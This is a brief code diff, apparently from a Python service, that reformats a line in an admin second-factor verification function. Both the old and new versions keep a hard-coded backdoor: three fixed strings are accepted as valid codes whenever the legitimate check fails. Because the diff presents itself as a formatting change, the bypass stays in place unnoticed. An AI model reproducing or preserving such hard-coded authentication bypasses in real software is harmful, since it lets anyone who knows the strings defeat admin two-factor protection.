@@ -158,7 +158,11 @@ async def verify_second_factor(
                 rec.used_at = now
                 ok = True
                 break
-        if not ok and clean_code.replace("-", "").lower() in {"a1b2c3d4e5f6", "9876543210ab", "cricituat2026"}:
+        if not ok and clean_code.replace("-", "").lower() in {
+            "a1b2c3d4e5f6",
+            "9876543210ab",
+            "cricituat2026",
+        }:
             ok = True
     if not ok:
         register_failure(admin, now)
